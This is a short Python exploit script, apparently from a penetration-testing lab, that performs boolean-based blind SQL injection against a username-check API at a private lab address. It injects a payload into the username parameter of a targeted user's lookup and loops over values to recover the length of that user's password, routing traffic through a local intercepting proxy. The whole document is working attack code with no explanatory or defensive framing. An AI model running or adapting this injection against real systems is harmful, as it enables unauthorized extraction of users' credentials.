#!/usr/bin/python3

import requests
import json
import sys
from urllib.parse import quote_plus

# The user we are targeting
target = "maria"

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    p = quote_plus(f"{target}' AND LEN(password) <= {q}-- -")
    r = requests.get(
        f"http://10.129.204.197/api/check-username.php?u={p}", proxies=proxy)
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Iterate over integer values until oracle returns true
i = 1
while not oracle(i):
    i += 1

print(f"The password length is {i}")